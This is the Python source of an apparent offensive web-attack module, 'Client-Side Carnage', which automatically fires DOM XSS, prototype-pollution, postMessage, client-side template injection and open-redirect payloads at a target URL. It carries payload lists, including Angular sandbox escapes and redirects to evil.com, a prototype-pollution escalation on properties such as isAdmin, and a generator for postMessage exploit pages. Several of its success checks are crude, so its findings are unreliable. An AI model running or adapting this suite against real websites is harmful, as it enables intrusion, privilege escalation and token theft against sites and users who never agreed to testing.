"""
BREACH.AI - Client-Side Carnage

Comprehensive client-side attack suite:
- DOM-based XSS
- Prototype Pollution
- postMessage Exploitation
- Client-side template injection
- Open Redirect chains
- JavaScript analysis
"""

import asyncio
import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Optional

from breach.attacks.base import AttackResult, BaseAttack
from breach.utils.logger import logger


@dataclass
class DOMSink:
    """Represents a dangerous DOM sink."""
    sink_type: str
    pattern: str
    severity: str
    description: str


@dataclass
class PrototypePollutionVector:
    """Prototype pollution attack vector."""
    payload: str
    target_property: str
    pollution_type: str


@dataclass
class PostMessageVuln:
    """postMessage vulnerability."""
    origin_check: bool
    handler_location: str
    dangerous_sinks: list[str]


class ClientSideCarnage(BaseAttack):
    """
    CLIENT-SIDE CARNAGE

    Destroys client-side security through:
    1. DOM XSS - Sources to sinks analysis
    2. Prototype Pollution - __proto__ and constructor attacks
    3. postMessage - Origin bypass and handler abuse
    4. CSTI - Client-side template injection
    5. Open Redirects - For OAuth and phishing chains
    """

    attack_type = "client_side"

    # DOM XSS Sources
    DOM_SOURCES = [
        "location",
        "location.href",
        "location.hash",
        "location.search",
        "location.pathname",
        "document.URL",
        "document.documentURI",
        "document.referrer",
        "window.name",
        "document.cookie",
        "localStorage",
        "sessionStorage",
        "IndexedDB",
    ]

    # DOM XSS Sinks
    DOM_SINKS = [
        DOMSink("html_injection", r"\.innerHTML\s*=", "critical", "Direct HTML injection"),
        DOMSink("html_injection", r"\.outerHTML\s*=", "critical", "Direct HTML injection"),
        DOMSink("html_injection", r"document\.write\s*\(", "critical", "Document write injection"),
        DOMSink("html_injection", r"document\.writeln\s*\(", "critical", "Document writeln injection"),
        DOMSink("script_injection", r"eval\s*\(", "critical", "Eval execution"),
        DOMSink("script_injection", r"Function\s*\(", "critical", "Function constructor"),
        DOMSink("script_injection", r"setTimeout\s*\([^,]*,", "high", "setTimeout with string"),
        DOMSink("script_injection", r"setInterval\s*\([^,]*,", "high", "setInterval with string"),
        DOMSink("script_injection", r"\.src\s*=", "high", "Script src manipulation"),
        DOMSink("url_redirect", r"location\s*=", "high", "Location assignment"),
        DOMSink("url_redirect", r"location\.href\s*=", "high", "Location href assignment"),
        DOMSink("url_redirect", r"location\.assign\s*\(", "high", "Location assign"),
        DOMSink("url_redirect", r"location\.replace\s*\(", "high", "Location replace"),
        DOMSink("url_redirect", r"window\.open\s*\(", "medium", "Window open"),
        DOMSink("jquery_html", r"\$\([^)]*\)\.html\s*\(", "critical", "jQuery HTML injection"),
        DOMSink("jquery_html", r"\$\([^)]*\)\.append\s*\(", "high", "jQuery append"),
        DOMSink("jquery_html", r"\$\([^)]*\)\.prepend\s*\(", "high", "jQuery prepend"),
        DOMSink("jquery_html", r"\$\([^)]*\)\.after\s*\(", "high", "jQuery after"),
        DOMSink("jquery_html", r"\$\([^)]*\)\.before\s*\(", "high", "jQuery before"),
        DOMSink("jquery_selector", r"\$\([^'\"]*['\"][^'\"]*\+", "high", "Dynamic jQuery selector"),
        DOMSink("angular", r"ng-bind-html\s*=", "critical", "Angular HTML binding"),
        DOMSink("angular", r"\$sce\.trustAsHtml", "critical", "Angular trusted HTML"),
        DOMSink("react", r"dangerouslySetInnerHTML", "critical", "React dangerous HTML"),
        DOMSink("vue", r"v-html\s*=", "critical", "Vue HTML directive"),
    ]

    # Prototype pollution payloads
    PROTO_POLLUTION_PAYLOADS = [
        # URL parameter pollution
        ("__proto__[test]=polluted", "__proto__", "url_param"),
        ("__proto__.test=polluted", "__proto__", "url_param"),
        ("constructor[prototype][test]=polluted", "constructor.prototype", "url_param"),
        ("constructor.prototype.test=polluted", "constructor.prototype", "url_param"),

        # JSON pollution
        ('{"__proto__":{"test":"polluted"}}', "__proto__", "json"),
        ('{"constructor":{"prototype":{"test":"polluted"}}}', "constructor.prototype", "json"),

        # Deep merge pollution
        ('{"a":{"__proto__":{"test":"polluted"}}}', "nested.__proto__", "deep_merge"),

        # Array pollution
        ("__proto__[0]=polluted", "__proto__[0]", "array"),
    ]

    # Dangerous properties to pollute
    DANGEROUS_PROPERTIES = [
        "isAdmin",
        "admin",
        "role",
        "authenticated",
        "auth",
        "debug",
        "test",
        "dev",
        "innerHTML",
        "src",
        "href",
        "text",
        "value",
        "shell",
        "exec",
        "command",
        "env",
        "NODE_OPTIONS",
    ]

    # Open redirect payloads
    REDIRECT_PAYLOADS = [
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "/\\evil.com",
        "\\/evil.com",
        "//evil.com/",
        "https://evil.com",
        "https:evil.com",
        "//evil.com%2F%2F",
        "//evil.com@trusted.com",
        "//trusted.com@evil.com",
        "//%0D%0Aevil.com",
        "//evil%E3%80%82com",
        "//evil。com",
        "////evil.com//",
        "https://evil.com#@trusted.com",
        "https://evil.com?@trusted.com",
        "javascript:alert(1)//",
        "data:text/html,<script>alert(1)</script>",
    ]

    # CSTI (Client-side Template Injection) payloads
    CSTI_PAYLOADS = {
        "angular": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)');}}",
            "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x]alert(1)');}}",
        ],
        "vue": [
            "{{_c.constructor('alert(1)')()}}",
            "{{this.constructor.constructor('alert(1)')()}}",
        ],
        "generic": [
            "${7*7}",
            "{{7*7}}",
            "#{7*7}",
            "${{7*7}}",
            "[[7*7]]",
            "{= 7*7 =}",
            "<%= 7*7 %>",
        ],
    }

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> Optional[AttackResult]:
        """
        Execute client-side attack suite.
        """
        findings = []

        # Fetch page content for analysis
        try:
            response = await self.http.get(url)
            page_content = response.text if hasattr(response, 'text') else str(response.body)
        except Exception as e:
            logger.debug(f"Failed to fetch page: {e}")
            page_content = ""

        # Run all client-side attacks
        attack_tasks = [
            self._hunt_dom_xss(url, page_content),
            self._hunt_prototype_pollution(url, parameter),
            self._hunt_postmessage_vulns(url, page_content),
            self._hunt_csti(url, parameter),
            self._hunt_open_redirects(url, parameter),
            self._analyze_javascript(url, page_content),
        ]

        results = await asyncio.gather(*attack_tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, list):
                findings.extend(result)
            elif isinstance(result, dict) and result.get("vulnerable"):
                findings.append(result)

        if findings:
            # Get highest severity finding
            severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
            findings.sort(key=lambda x: severity_order.get(x.get("severity", "low"), 3))

            top_finding = findings[0]

            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                parameter=parameter,
                payload=top_finding.get("payload", ""),
                details=f"Client-side vulnerabilities found: {len(findings)} issues",
                severity=top_finding.get("severity", "high"),
                evidence={
                    "findings": findings,
                    "total_issues": len(findings),
                    "attack_types": list(set(f.get("type") for f in findings)),
                },
            )

        return None

    async def _hunt_dom_xss(
        self,
        url: str,
        page_content: str
    ) -> list[dict]:
        """
        Hunt for DOM-based XSS vulnerabilities.

        Analyzes JavaScript for source-to-sink flows.
        """
        findings = []

        # Extract all JavaScript
        js_content = self._extract_javascript(page_content)

        # Find dangerous sinks
        for sink in self.DOM_SINKS:
            matches = re.finditer(sink.pattern, js_content, re.IGNORECASE)
            for match in matches:
                # Get context around the sink
                start = max(0, match.start() - 100)
                end = min(len(js_content), match.end() + 100)
                context = js_content[start:end]

                # Check if any source flows to this sink
                for source in self.DOM_SOURCES:
                    if source.lower() in context.lower():
                        findings.append({
                            "type": "dom_xss",
                            "vulnerable": True,
                            "sink_type": sink.sink_type,
                            "sink_pattern": sink.pattern,
                            "source": source,
                            "severity": sink.severity,
                            "description": sink.description,
                            "context": context.strip(),
                            "payload": self._generate_dom_xss_payload(source),
                        })

        # Test reflected DOM XSS via URL parameters
        dom_xss_payloads = [
            "<img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            '"-alert(1)-"',
            "javascript:alert(1)",
            "#<script>alert(1)</script>",
        ]

        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        for param in params:
            for payload in dom_xss_payloads:
                test_url = self._inject_param(url, param, payload)
                try:
                    response = await self.http.get(test_url)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    # Check if payload appears unencoded in response
                    if payload in body or urllib.parse.unquote(payload) in body:
                        findings.append({
                            "type": "reflected_dom_xss",
                            "vulnerable": True,
                            "parameter": param,
                            "payload": payload,
                            "severity": "high",
                            "url": test_url,
                        })
                        break
                except Exception:
                    pass

        return findings

    async def _hunt_prototype_pollution(
        self,
        url: str,
        parameter: Optional[str] = None
    ) -> list[dict]:
        """
        Hunt for prototype pollution vulnerabilities.

        Tests URL parameters and JSON bodies for __proto__ pollution.
        """
        findings = []

        # Test URL parameter pollution
        for payload, target, pollution_type in self.PROTO_POLLUTION_PAYLOADS:
            if pollution_type == "url_param":
                # Add pollution payload to URL
                if "?" in url:
                    test_url = f"{url}&{payload}"
                else:
                    test_url = f"{url}?{payload}"

                try:
                    response = await self.http.get(test_url)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    # Check for pollution indicators
                    if self._check_pollution_success(body):
                        findings.append({
                            "type": "prototype_pollution",
                            "vulnerable": True,
                            "vector": "url_parameter",
                            "payload": payload,
                            "target": target,
                            "severity": "high",
                            "url": test_url,
                        })
                except Exception:
                    pass

            elif pollution_type == "json":
                # Test JSON body pollution
                try:
                    headers = {"Content-Type": "application/json"}
                    response = await self.http.post(url, data=payload, headers=headers)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    if self._check_pollution_success(body):
                        findings.append({
                            "type": "prototype_pollution",
                            "vulnerable": True,
                            "vector": "json_body",
                            "payload": payload,
                            "target": target,
                            "severity": "critical",
                        })
                except Exception:
                    pass

        # Test dangerous property pollution
        for prop in self.DANGEROUS_PROPERTIES:
            payloads = [
                f"__proto__[{prop}]=true",
                f"constructor[prototype][{prop}]=true",
            ]

            for payload in payloads:
                if "?" in url:
                    test_url = f"{url}&{payload}"
                else:
                    test_url = f"{url}?{payload}"

                try:
                    response = await self.http.get(test_url)

                    # Check for behavior changes indicating pollution
                    if response.status_code == 200:
                        body = response.text if hasattr(response, 'text') else str(response.body)

                        # Look for signs the property was used
                        if prop in ["isAdmin", "admin", "role", "authenticated"]:
                            if "admin" in body.lower() or "unauthorized" not in body.lower():
                                findings.append({
                                    "type": "prototype_pollution_escalation",
                                    "vulnerable": True,
                                    "property": prop,
                                    "payload": payload,
                                    "severity": "critical",
                                    "impact": "Potential privilege escalation",
                                })
                except Exception:
                    pass

        return findings

    async def _hunt_postmessage_vulns(
        self,
        url: str,
        page_content: str
    ) -> list[dict]:
        """
        Hunt for postMessage vulnerabilities.

        Looks for:
        - Missing origin checks
        - eval() in message handlers
        - innerHTML in message handlers
        """
        findings = []

        # Find postMessage handlers
        handler_patterns = [
            r"addEventListener\s*\(\s*['\"]message['\"]",
            r"onmessage\s*=",
            r"window\.onmessage",
        ]

        js_content = self._extract_javascript(page_content)

        for pattern in handler_patterns:
            matches = re.finditer(pattern, js_content, re.IGNORECASE)
            for match in matches:
                # Get handler context
                start = match.start()
                # Find the handler function
                brace_count = 0
                end = start
                found_start = False

                for i, char in enumerate(js_content[start:start+2000]):
                    if char == '{':
                        found_start = True
                        brace_count += 1
                    elif char == '}':
                        brace_count -= 1
                        if found_start and brace_count == 0:
                            end = start + i + 1
                            break

                handler_code = js_content[start:end]

                # Check for origin validation
                has_origin_check = bool(re.search(
                    r"(event|e|evt)\.origin\s*(===|!==|==|!=)",
                    handler_code,
                    re.IGNORECASE
                ))

                # Check for dangerous operations
                dangerous_ops = []

                if re.search(r"eval\s*\(", handler_code):
                    dangerous_ops.append("eval()")

                if re.search(r"\.innerHTML\s*=", handler_code):
                    dangerous_ops.append("innerHTML")

                if re.search(r"Function\s*\(", handler_code):
                    dangerous_ops.append("Function()")

                if re.search(r"document\.write", handler_code):
                    dangerous_ops.append("document.write()")

                if re.search(r"\$\([^)]*\)\.html\s*\(", handler_code):
                    dangerous_ops.append("jQuery.html()")

                if re.search(r"location\s*=|location\.(href|assign|replace)", handler_code):
                    dangerous_ops.append("location redirect")

                if dangerous_ops:
                    severity = "critical" if not has_origin_check else "high"

                    findings.append({
                        "type": "postmessage_xss",
                        "vulnerable": True,
                        "has_origin_check": has_origin_check,
                        "dangerous_operations": dangerous_ops,
                        "severity": severity,
                        "handler_preview": handler_code[:500],
                        "exploitation": self._generate_postmessage_exploit(
                            url, dangerous_ops, has_origin_check
                        ),
                    })

        # Check for postMessage usage (potential sender vulnerabilities)
        postmessage_calls = re.findall(
            r"\.postMessage\s*\([^)]+\)",
            js_content,
            re.IGNORECASE
        )

        for call in postmessage_calls:
            # Check if using wildcard origin
            if '"*"' in call or "'*'" in call:
                findings.append({
                    "type": "postmessage_leak",
                    "vulnerable": True,
                    "issue": "postMessage with wildcard origin",
                    "severity": "medium",
                    "call": call,
                })

        return findings

    async def _hunt_csti(
        self,
        url: str,
        parameter: Optional[str] = None
    ) -> list[dict]:
        """
        Hunt for Client-Side Template Injection.

        Tests Angular, Vue, and other client-side template engines.
        """
        findings = []

        # Detect framework from response
        try:
            response = await self.http.get(url)
            body = response.text if hasattr(response, 'text') else str(response.body)
        except Exception:
            return findings

        # Detect framework
        framework = self._detect_framework(body)

        # Get appropriate payloads
        if framework:
            payloads = self.CSTI_PAYLOADS.get(framework, []) + self.CSTI_PAYLOADS["generic"]
        else:
            payloads = self.CSTI_PAYLOADS["generic"]

        # Test each parameter or add to URL
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        test_params = list(params.keys()) if params else ["q", "search", "input", "data"]
        if parameter:
            test_params = [parameter]

        for param in test_params:
            for payload in payloads:
                test_url = self._inject_param(url, param, payload)

                try:
                    response = await self.http.get(test_url)
                    body = response.text if hasattr(response, 'text') else str(response.body)

                    # Check for template evaluation
                    if "49" in body and "7*7" in payload:  # 7*7 = 49
                        findings.append({
                            "type": "csti",
                            "vulnerable": True,
                            "framework": framework or "unknown",
                            "parameter": param,
                            "payload": payload,
                            "severity": "high",
                            "url": test_url,
                        })
                        break

                    # Check for Angular-specific execution
                    if "alert" in payload.lower() and framework == "angular":
                        # Angular sandbox bypass detected
                        findings.append({
                            "type": "angular_sandbox_bypass",
                            "vulnerable": True,
                            "parameter": param,
                            "payload": payload,
                            "severity": "critical",
                        })
                        break

                except Exception:
                    pass

        return findings

    async def _hunt_open_redirects(
        self,
        url: str,
        parameter: Optional[str] = None
    ) -> list[dict]:
        """
        Hunt for open redirect vulnerabilities.

        Tests URL parameters for redirect bypasses.
        """
        findings = []

        # Common redirect parameters
        redirect_params = [
            "redirect", "redirect_uri", "redirect_url", "return", "return_url",
            "returnTo", "return_to", "next", "url", "target", "rurl", "dest",
            "destination", "redir", "redirect_to", "out", "view", "to", "link",
            "goto", "continue", "forward", "path", "data", "reference", "site",
            "html", "val", "validate", "domain", "callback", "return_path",
        ]

        if parameter:
            redirect_params = [parameter]

        for param in redirect_params:
            for payload in self.REDIRECT_PAYLOADS:
                test_url = self._inject_param(url, param, payload)

                try:
                    # Don't follow redirects
                    response = await self.http.get(test_url, follow_redirects=False)

                    # Check for redirect
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get("location", "")

                        # Check if redirect goes to our evil domain
                        if "evil.com" in location or location.startswith(payload):
                            findings.append({
                                "type": "open_redirect",
                                "vulnerable": True,
                                "parameter": param,
                                "payload": payload,
                                "redirect_location": location,
                                "severity": "medium",
                                "url": test_url,
                                "impact": "OAuth token theft, phishing",
                            })
                            break

                    # Check for JavaScript redirect in body
                    body = response.text if hasattr(response, 'text') else str(response.body)
                    if "evil.com" in body and ("location" in body.lower() or "redirect" in body.lower()):
                        findings.append({
                            "type": "open_redirect_js",
                            "vulnerable": True,
                            "parameter": param,
                            "payload": payload,
                            "severity": "medium",
                            "url": test_url,
                        })
                        break

                except Exception:
                    pass

        return findings

    async def _analyze_javascript(
        self,
        url: str,
        page_content: str
    ) -> list[dict]:
        """
        Analyze JavaScript for security issues.

        Looks for:
        - Hardcoded secrets
        - Dangerous patterns
        - Information disclosure
        """
        findings = []

        js_content = self._extract_javascript(page_content)

        # Check for hardcoded secrets
        secret_patterns = [
            (r"api[_-]?key\s*[:=]\s*['\"]([^'\"]+)['\"]", "API Key"),
            (r"apikey\s*[:=]\s*['\"]([^'\"]+)['\"]", "API Key"),
            (r"secret\s*[:=]\s*['\"]([^'\"]+)['\"]", "Secret"),
            (r"password\s*[:=]\s*['\"]([^'\"]+)['\"]", "Password"),
            (r"token\s*[:=]\s*['\"]([a-zA-Z0-9_-]{20,})['\"]", "Token"),
            (r"aws[_-]?access[_-]?key\s*[:=]\s*['\"]([^'\"]+)['\"]", "AWS Key"),
            (r"AKIA[0-9A-Z]{16}", "AWS Access Key ID"),
            (r"AIza[0-9A-Za-z_-]{35}", "Google API Key"),
            (r"sk_live_[0-9a-zA-Z]{24}", "Stripe Secret Key"),
            (r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", "Private Key"),
        ]

        for pattern, secret_type in secret_patterns:
            matches = re.finditer(pattern, js_content, re.IGNORECASE)
            for match in matches:
                findings.append({
                    "type": "hardcoded_secret",
                    "vulnerable": True,
                    "secret_type": secret_type,
                    "severity": "high",
                    "match": match.group(0)[:100],
                })

        # Check for dangerous patterns
        dangerous_patterns = [
            (r"\.setRequestHeader\s*\(\s*['\"]Authorization['\"]", "Auth header in client-side"),
            (r"btoa\s*\([^)]*password", "Base64 encoded password"),
            (r"localStorage\.setItem\s*\([^)]*token", "Token in localStorage"),
            (r"document\.cookie\s*=(?!.*httpOnly)", "Cookie without httpOnly"),
        ]

        for pattern, issue in dangerous_patterns:
            if re.search(pattern, js_content, re.IGNORECASE):
                findings.append({
                    "type": "dangerous_pattern",
                    "vulnerable": True,
                    "issue": issue,
                    "severity": "medium",
                })

        # Look for source maps
        if ".map" in js_content or "sourceMappingURL" in js_content:
            findings.append({
                "type": "source_map_exposed",
                "vulnerable": True,
                "severity": "low",
                "issue": "Source maps may expose original source code",
            })

        # Check for debug mode indicators
        debug_patterns = [
            r"debug\s*[:=]\s*true",
            r"DEBUG\s*[:=]\s*true",
            r"development\s*[:=]\s*true",
            r"console\.(log|debug|info)\s*\(",
        ]

        for pattern in debug_patterns:
            if re.search(pattern, js_content, re.IGNORECASE):
                findings.append({
                    "type": "debug_mode",
                    "vulnerable": True,
                    "severity": "low",
                    "issue": "Debug mode may be enabled",
                })
                break

        return findings

    def _extract_javascript(self, html: str) -> str:
        """Extract all JavaScript from HTML."""
        js_content = []

        # Extract inline scripts
        script_pattern = r"<script[^>]*>(.*?)</script>"
        matches = re.findall(script_pattern, html, re.DOTALL | re.IGNORECASE)
        js_content.extend(matches)

        # Extract event handlers
        event_pattern = r"on\w+\s*=\s*['\"]([^'\"]+)['\"]"
        matches = re.findall(event_pattern, html, re.IGNORECASE)
        js_content.extend(matches)

        return "\n".join(js_content)

    def _detect_framework(self, html: str) -> Optional[str]:
        """Detect JavaScript framework from HTML."""
        if "ng-app" in html or "angular" in html.lower():
            return "angular"
        if "vue" in html.lower() or "v-model" in html:
            return "vue"
        if "react" in html.lower() or "data-reactroot" in html:
            return "react"
        return None

    def _check_pollution_success(self, body: str) -> bool:
        """Check if prototype pollution was successful."""
        # Look for signs of pollution
        indicators = [
            "polluted",
            "test\":\"polluted",
            "true",  # For boolean pollution
            "[object Object]",  # Object pollution side effect
        ]
        return any(ind in body for ind in indicators)

    def _generate_dom_xss_payload(self, source: str) -> str:
        """Generate DOM XSS payload for specific source."""
        if source in ["location.hash", "location"]:
            return "#<img src=x onerror=alert(document.domain)>"
        elif source == "location.search":
            return "?x=<img src=x onerror=alert(document.domain)>"
        elif source == "document.referrer":
            return "Set Referer header to: <script>alert(1)</script>"
        elif source == "window.name":
            return "Set window.name to: <script>alert(1)</script>"
        else:
            return "<script>alert(document.domain)</script>"

    def _generate_postmessage_exploit(
        self,
        target_url: str,
        dangerous_ops: list[str],
        has_origin_check: bool
    ) -> str:
        """Generate postMessage exploit code."""
        if "innerHTML" in dangerous_ops:
            payload = "<img src=x onerror=alert(document.domain)>"
        elif "eval()" in dangerous_ops:
            payload = "alert(document.domain)"
        else:
            payload = "javascript:alert(document.domain)"

        exploit = f"""
<html>
<body>
<iframe id="target" src="{target_url}"></iframe>
<script>
    var target = document.getElementById('target');
    target.onload = function() {{
        target.contentWindow.postMessage('{payload}', '*');
    }};
</script>
</body>
</html>
"""
        return exploit.strip()

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a parameter value into URL."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [value]

        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))


class DOMXSSHunter(BaseAttack):
    """Focused DOM XSS detection."""

    attack_type = "dom_xss"

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> Optional[AttackResult]:
        """Run DOM XSS specific tests."""
        carnage = ClientSideCarnage(self.http)

        try:
            response = await self.http.get(url)
            page_content = response.text if hasattr(response, 'text') else str(response.body)
        except Exception:
            page_content = ""

        findings = await carnage._hunt_dom_xss(url, page_content)

        if findings:
            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                parameter=parameter,
                payload=findings[0].get("payload", ""),
                details=f"DOM XSS found: {findings[0].get('description', '')}",
                severity="high",
                evidence={"findings": findings},
            )
        return None


class PrototypePollutionHunter(BaseAttack):
    """Focused prototype pollution detection."""

    attack_type = "prototype_pollution"

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> Optional[AttackResult]:
        """Run prototype pollution tests."""
        carnage = ClientSideCarnage(self.http)
        findings = await carnage._hunt_prototype_pollution(url, parameter)

        if findings:
            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                parameter=parameter,
                payload=findings[0].get("payload", ""),
                details=f"Prototype pollution: {findings[0].get('vector', '')}",
                severity="high",
                evidence={"findings": findings},
            )
        return None


async def unleash_client_carnage(
    target_url: str,
    http_client: Any = None,
) -> dict:
    """
    Convenience function to run full client-side attack suite.

    Args:
        target_url: Target URL
        http_client: HTTP client instance

    Returns:
        Dictionary with all findings
    """
    from breach.utils.http import HTTPClient

    client = http_client or HTTPClient(base_url=target_url)
    own_client = http_client is None

    try:
        carnage = ClientSideCarnage(client)
        result = await carnage.run(target_url)

        return {
            "success": result is not None and result.success,
            "findings": result.evidence if result else {},
            "target": target_url,
        }
    finally:
        if own_client:
            await client.close()
